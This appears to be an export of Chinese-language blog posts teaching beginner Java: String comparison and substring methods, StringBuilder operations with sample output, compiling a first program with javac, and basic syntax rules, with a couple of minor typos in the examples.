title="字符串比较常见操作，包括比较大小，比较相等，比较前缀和后缀等"></a>字符串比较常见操作，包括比较大小，比较相等，比较前缀和后缀等</h4></blockquote><h5 id="比较相等"><a href="#比较相等" class="headerlink" title="比较相等"></a>比较相等</h5><ul><li>boolean equals(Object anObject):比较两个字符串内容是否相等。</li><li>boolean equalsIgnoreCase(String anotherString)：类似equals方法，只是忽略大小写。<h5 id="比较大小"><a href="#比较大小" class="headerlink" title="比较大小"></a>比较大小</h5></li><li>int compareTo(String anotherString)：安装字典顺序比较大小。如果参数字符串等于此字符串，则返回值 0；如果此字符串小于字符串参数，则返回一个小于0 的值；如果此字符串大于字符串参数，则返回一个大于 0 的值。</li><li>int compareToIgnoreCase(String str)：类似compareTo，只是忽略大小写。<h5 id="比较前缀后缀"><a href="#比较前缀后缀" class="headerlink" title="比较前缀后缀"></a>比较前缀后缀</h5></li><li>boolean endsWith(String suffix)：测试次字符串是否是指定的后缀结束。</li><li>boolean startsWith(String prefix)：测试字符串是否是指定的前缀开始。<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Str_Comparison</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String s1 = <span class="keyword">new</span> String(<span class="string">"Hello"</span>);</span><br><span class="line">        String s2 = <span class="keyword">new</span> String(<span class="string">"Hello"</span>);</span><br><span class="line">        System.out.println(<span class="string">"s1 == s2 :"</span>+(s1 == s2));</span><br><span class="line">        System.out.println(<span class="string">"s1.equals(s2):"</span>+(s1.equals(s2)));</span><br><span class="line"></span><br><span class="line">        String s3 = <span class="string">"HeLLo"</span>;</span><br><span class="line">        System.out.println(<span class="string">"s1.equalsIgnoreCase(s3):"</span>+s1.equalsIgnoreCase(s3));</span><br><span class="line"></span><br><span class="line">        String s4 = <span class="string">"java"</span>;</span><br><span class="line">        String s5 = <span class="string">"Switch"</span>;</span><br><span class="line">        System.out.println(<span class="string">"s4.compareTo(s5):"</span>+s4.compareTo(s5));</span><br><span class="line">        System.out.println(<span class="string">"s4.compareToIgnoreCase(s5):"</span>+s4.compareToIgnoreCase(s5));</span><br><span class="line"></span><br><span class="line">        String[] docForder = &#123; <span class="string">"java.docx"</span>, <span class="string">"JavaBean.docx"</span>, <span class="string">"Objecitve-C.xlsx"</span>, <span class="string">"Swift.docx"</span> &#125;;</span><br><span class="line">        <span class="keyword">int</span> doccount = <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">for</span> (String doc : docForder)&#123;</span><br><span class="line"><span class="comment">//            去除前后空格</span></span><br><span class="line">            doc = doc.intern();</span><br><span class="line"><span class="comment">//            比较后缀是否是.docx</span></span><br><span class="line">            <span class="keyword">if</span> (doc.endsWith(<span class="string">".docx"</span>))&#123;</span><br><span class="line">                doccount ++ ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"查找到docx后缀的文件个数："</span>+doccount);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> javadocnumber = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (String doc : docForder) &#123;</span><br><span class="line">            doc = doc.intern();</span><br><span class="line">            doc = doc.toLowerCase();</span><br><span class="line">            <span class="keyword">if</span> (doc.startsWith(<span class="string">"java"</span>))&#123;</span><br><span class="line">                javadocnumber ++ ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"关于java相关文件个数："</span>+javadocnumber);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ul><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s1 == s2 :false</span><br><span class="line">s1.equals(s2):true</span><br><span class="line">s1.equalsIgnoreCase(s3):true</span><br><span class="line">s4.compareTo(s5):23</span><br><span class="line">s4.compareToIgnoreCase(s5):-9</span><br><span class="line">查找到docx后缀的文件个数：3</span><br><span class="line">关于java相关文件个数：2</span><br></pre></td></tr></table></figure></div><h3 id="字符串的截取"><a href="#字符串的截取" class="headerlink" title="字符串的截取"></a>字符串的截取</h3><ul><li>String substring(int beginIndex)：从指定索引 beginIndex 开始截取一直到字符串结束的子字符串。</li><li>String substring(int beginIndex, int endIndex)：从指定索引 beginIndex 开始截取直到索引 endIndex - 1 处的字符，注意包括索引为 beginIndex 处的字符，但不包括索引为 endIndex 处的字符。<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Str_Intercept</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String sourceStr = <span class="string">"There is a string accessing example."</span>;</span><br><span class="line">        String subStr1 = sourceStr.substring(<span class="number">28</span>);</span><br><span class="line">        String subStr2 = sourceStr.substring(<span class="number">11</span>,<span class="number">17</span>);</span><br><span class="line">        System.out.printf(<span class="string">"subStr1 = %s%n"</span>,subStr1);</span><br><span class="line">        System.out.printf(<span class="string">"subStr2 = %s%n"</span>,subStr2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"-----使用split-----"</span>);</span><br><span class="line">        String[] array = sourceStr.split(<span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">for</span> (String str : array)&#123;</span><br><span class="line">            System.out.println(str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ul><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">subStr1 = example.</span><br><span class="line">subStr2 = string</span><br><span class="line">-----使用split-----</span><br><span class="line">There</span><br><span class="line">is</span><br><span class="line">a</span><br><span class="line">string</span><br><span class="line">accessing</span><br><span class="line">example.</span><br></pre></td></tr></table></figure></div><h2 id="可变字符串"><a href="#可变字符串" class="headerlink" title="可变字符串"></a>可变字符串</h2><blockquote><p>  可变字符串在追加、删除、修改、插入和拼接等操作不会产生新的对象。</p></blockquote><h3 id="StringBuffer-和-StringBuilder"><a href="#StringBuffer-和-StringBuilder" class="headerlink" title="StringBuffer 和 StringBuilder"></a>StringBuffer 和 StringBuilder</h3><blockquote><p> StringBuffer 和 StringBuilder 具有完全相同的 API，即构造方法和方法等内容一样。</p><ul><li>StringBuilder()：创建字符串内容是空的 StringBuilder 对象，初始容量默认为 16个字符。</li><li>StringBuilder(CharSequence seq)：指定 CharSequence 字符串创建 StringBuilder 对象。CharSequence 接口类型，它的实现类有：String、StringBuffer 和 StringBuilder等，所以参数 seq 可以是 String、StringBuffer 和 StringBuilder 等类型。</li><li>StringBuilder(int capacity)：创建字符串内容是空的 StringBuilder 对象，初始容量由参数 capacity 指定的。</li><li>StringBuilder(String str)：指定 String 字符串创建 StringBuilder 对象。</li></ul></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">variable_str</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        StringBuilder sbuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        System.out.println(<span class="string">"包含字符串长度："</span>+sbuilder.length());</span><br><span class="line">        System.out.println(<span class="string">"字符串缓冲区容量："</span>+sbuilder.capacity());</span><br><span class="line"></span><br><span class="line">        StringBuilder sbuilder1 = <span class="keyword">new</span> StringBuilder(<span class="string">"Hello"</span>);</span><br><span class="line">        System.out.println(<span class="string">"包含字符串长度："</span>+sbuilder1.length());</span><br><span class="line">        System.out.println(<span class="string">"字符串缓冲区容量："</span>+sbuilder1.capacity());</span><br><span class="line"></span><br><span class="line">        StringBuilder sbuilder2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">17</span>;i++)&#123;</span><br><span class="line">            sbuilder2.append(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"包含字符串长度："</span>+sbuilder2.length());</span><br><span class="line">        System.out.println(<span class="string">"字符串缓冲区容量："</span>+sbuilder2.capacity());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">包含字符串长度：0</span><br><span class="line">字符串缓冲区容量：16</span><br><span class="line">包含字符串长度：5</span><br><span class="line">字符串缓冲区容量：21</span><br><span class="line">包含字符串长度：17</span><br><span class="line">字符串缓冲区容量：34</span><br></pre></td></tr></table></figure></div><h3 id="字符串追加"><a href="#字符串追加" class="headerlink" title="字符串追加"></a>字符串追加</h3><blockquote><p> StringBuilder 在提供了很多修改字符串缓冲区的方法，追加、插入、删除和替换等.字符串追加方法append.</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">add_str</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        StringBuilder sbuilder1 = <span class="keyword">new</span> StringBuilder(<span class="string">"Hello"</span>);</span><br><span class="line">        sbuilder1.append(<span class="string">" "</span>).append(<span class="string">"World"</span>);</span><br><span class="line">        sbuilder1.append(<span class="string">"."</span>);</span><br><span class="line">        System.out.println(sbuilder1);</span><br><span class="line"></span><br><span class="line">        StringBuilder sbuilder2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        Object obj = <span class="keyword">null</span>;</span><br><span class="line">        sbuilder2.append(<span class="keyword">false</span>).append(<span class="string">'\t'</span>).append(obj);</span><br><span class="line">        System.out.println(sbuilder2);</span><br><span class="line"></span><br><span class="line">        StringBuilder sbuilder3 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)&#123;</span><br><span class="line">            sbuilder3.append(i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sbuilder3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello World.</span><br><span class="line">falsenull</span><br><span class="line">012345678</span><br></pre></td></tr></table></figure></div><h3 id="字符串插入，删除，替换"><a href="#字符串插入，删除，替换" class="headerlink" title="字符串插入，删除，替换"></a>字符串插入，删除，替换</h3><blockquote><p> StringBuilder insert(int offset, String str)：在字符串缓冲区中索引为 offset 的字符位置之前插入 str，insert 有很多重载方法，可以插入任何类型数据。<br> StringBuffer delete(int start, int end)：在字符串缓冲区中删除子字符串，要删除的子字符串从指定索引 start 开始直到索引 end - 1 处的字符。start 和 end 两个参数与 substring(int beginIndex, int endIndex)方法中的两个参数含义一样。<br> StringBuffer replace(int start, int end, String str)字符串缓冲区中用 str 替换子字符串，子字符串从指定索引 start 开始直到索引 end - 1 处的字符。start 和 end 同delete(int start, int end)方法。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">java_insert_del_update</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String str1 = <span class="string">"Java C"</span>;</span><br><span class="line">        StringBuilder stb = <span class="keyword">new</span> StringBuilder(str1);</span><br><span class="line"></span><br><span class="line">        stb.insert(<span class="number">4</span>,<span class="string">" C++"</span>);</span><br><span class="line">        System.out.println(stb);</span><br><span class="line"></span><br><span class="line">        stb.insert(stb.length(),<span class="string">" Object-C"</span>);</span><br><span class="line">        System.out.println(stb);</span><br><span class="line"></span><br><span class="line">        stb.append(<span class="string">" and Switch"</span>);</span><br><span class="line">        System.out.println(stb);</span><br><span class="line"></span><br><span class="line">        stb.delete(<span class="number">11</span>,<span class="number">23</span>);</span><br><span class="line">        System.out.println(stb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Java C++ C</span><br><span class="line">Java C++ C Object-C</span><br><span class="line">Java C++ C Object-C and Switch</span><br><span class="line">Java C++ C  Switch</span><br></pre></td></tr></table></figure></div><h2 id="面向对象特性"><a href="#面向对象特性" class="headerlink" title="面向对象特性"></a>面向对象特性</h2><blockquote><p> 封装性，继承性，多态性。</p></blockquote><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="类声明"><a href="#类声明" class="headerlink" title="类声明"></a>类声明</h3><blockquote><p> 类的实现包括：类声明和类体。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[public][abstract|final] class className [extends superclassName] [implements interfaceNameList] &#123;</span><br><span class="line"><span class="comment">//类体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>class是声明类的关键词，className是自定义的类名，class前面的修饰符public，abstract，final用来声明类，他们也可以省略。</p><h3 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">className</span> </span>&#123;</span><br><span class="line">[<span class="keyword">public</span> | <span class="keyword">protected</span> | <span class="keyword">private</span> ] [<span class="keyword">static</span>] [<span class="keyword">final</span>] type variableName; <span class="comment">//成员变量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="type是成员变量数据类型，variableName是成员变量名称。"><a href="#type是成员变量数据类型，variableName是成员变量名称。" class="headerlink" title="type是成员变量数据类型，variableName是成员变量名称。"></a>type是成员变量数据类型，variableName是成员变量名称。</h4><blockquote><p> public、protected 和 private 修饰符用于封装成员变量。<br> static 修饰符用于声明静态变量，所以静态变量也称为“类变量”。<br> final 修饰符用于声明变量，该变量不能被修改。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一个java程序</title>
      <link href="/2019/01/29/di-yi-ge-java-cheng-xu/"/>
      <url>/2019/01/29/di-yi-ge-java-cheng-xu/</url>
      
        <content type="html"><![CDATA[<h1 id="第一个java程序"><a href="#第一个java程序" class="headerlink" title="第一个java程序"></a>第一个java程序</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">helloword</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.print(<span class="string">"Hello World."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li>只能一个类声明为公有的（public）</li><li>文件名称必须与公有类名完全一致，包括字母大小写·。</li><li>public static  void main(String[] args) 只能定义在公有类中</li></ul><h1 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h1><h4 id="编译需要到程序根目录下利用javac来编译"><a href="#编译需要到程序根目录下利用javac来编译" class="headerlink" title="编译需要到程序根目录下利用javac来编译"></a>编译需要到程序根目录下利用javac来编译</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\java_sty\src\hello&gt;ls</span><br><span class="line">helloword.java</span><br><span class="line"></span><br><span class="line">E:\java_sty\src\hello&gt;javac helloword.java</span><br><span class="line"></span><br><span class="line">E:\java_sty\src\hello&gt;ls</span><br><span class="line">helloword.class  helloword.java</span><br></pre></td></tr></table></figure></div><h3 id="此时目录下生产了一个helloworld-class类文件。"><a href="#此时目录下生产了一个helloworld-class类文件。" class="headerlink" title="此时目录下生产了一个helloworld.class类文件。"></a>此时目录下生产了一个helloworld.class类文件。</h3><h3 id="若定义的包不是在这个目录下，需要添加-d-参数。将会自动创建文件夹及文件。"><a href="#若定义的包不是在这个目录下，需要添加-d-参数。将会自动创建文件夹及文件。" class="headerlink" title="若定义的包不是在这个目录下，需要添加-d 参数。将会自动创建文件夹及文件。"></a>若定义的包不是在这个目录下，需要添加-d 参数。将会自动创建文件夹及文件。</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> create1.create2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span>  <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.print(<span class="string">"Hello world!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SH"><figure class="iseeu highlight /sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">E:\java_sty\src\hello2&gt;ls</span><br><span class="line">hello2.java</span><br><span class="line"></span><br><span class="line">E:\java_sty\src\hello2&gt;javac hello2.java</span><br><span class="line"></span><br><span class="line">E:\java_sty\src\hello2&gt;ls</span><br><span class="line">hello2.class  hello2.java</span><br><span class="line"></span><br><span class="line">E:\java_sty\src\hello2&gt;javac -d . hello2.java</span><br><span class="line"></span><br><span class="line">E:\java_sty\src\hello2&gt;ls</span><br><span class="line">create1  hello2.class  hello2.java</span><br><span class="line"></span><br><span class="line">E:\java_sty\src\hello2&gt;<span class="built_in">cd</span> create1</span><br><span class="line"></span><br><span class="line">E:\java_sty\src\hello2\create1&gt;<span class="built_in">cd</span> create2</span><br><span class="line"></span><br><span class="line">E:\java_sty\src\hello2\create1\create2&gt;ls</span><br><span class="line">hello2.class</span><br></pre></td></tr></table></figure></div><h1 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java xxxx.xxx</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA基本语法</title>
      <link href="/2019/01/29/java-ji-ben-yu-fa/"/>
      <url>/2019/01/29/java-ji-ben-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA基本语法"><a href="#JAVA基本语法" class="headerlink" title="JAVA基本语法"></a>JAVA基本语法</h1><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><blockquote><p>变量，常量，方法，枚举，类，接口的你敢由程序员指定的名字。</p><ul><li>区分大小写</li><li>首字符，可以是下划线(_)或者美元符或者字母，但不能是数字</li><li>除首字符外其他字符，可以是下划线(_)，美元符，字母和数字。</li><li>关键字不能作为标识符</li></ul></blockquote><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><blockquote><p> Java的全部关键字都是小写字母</p></blockquote><h3 id="保留字"><a href="#保留字" class="headerlink" title="保留字"></a>保留字</h3><blockquote><p> 一些字符序列即不能当作标识符使用，也不是关键字，也不能在程序中使用，这些字符序列被称为保留字。</p><ul><li>1.goto：在java中不再使用goto语句，因为“无限跳转”语句会破坏程序结构。在java语言中goto的替换语句可以通过break，continue，return实现“有限跳转”。</li><li>2.const：在其他语言是声明常量关键字，在java语言中声明变量使用public static final方式声明。</li></ul></blockquote><h2 id="Java-分隔符"><a href="#Java-分隔符" class="headerlink" title="Java 分隔符"></a>Java 分隔符</h2><h3 id="分号"><a href="#分号" class="headerlink" title="分号"></a>分号</h3><blockquote><p> 分号在java中，它表示一条语句结束。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>+<span class="number">2</span>+<span class="number">3</span>;</span><br><span class="line">等价于</span><br><span class="line"><span class="keyword">int</span> i <span class="number">1</span>+<span class="number">2</span></span><br><span class="line">+<span class="number">3</span>;</span><br></pre></td></tr></table></figure></div><h3 id="大括号"><a href="#大括号" class="headerlink" title="大括号"></a>大括号</h3><blockquote><h3 id="左右大括号括起的语句集合称为语句块-block-或复合语句，在语句块可以有n条语句。在定义类或方法时，语句块也被做分隔类体或方法体。语句块可以嵌套，且嵌套层次没有限制。"><a href="#左右大括号括起的语句集合称为语句块-block-或复合语句，在语句块可以有n条语句。在定义类或方法时，语句块也被做分隔类体或方法体。语句块可以嵌套，且嵌套层次没有限制。" class="headerlink" title="左右大括号括起的语句集合称为语句块(block)或复合语句，在语句块可以有n条语句。在定义类或方法时，语句块也被做分隔类体或方法体。语句块可以嵌套，且嵌套层次没有限制。"></a>左右大括号括起的语句集合称为语句块(block)或复合语句，在语句块可以有n条语句。在定义类或方法时，语句块也被做分隔类体或方法体。语句块可以嵌套，且嵌套层次没有限制。</h3></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> basic_grammar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">brace</span> 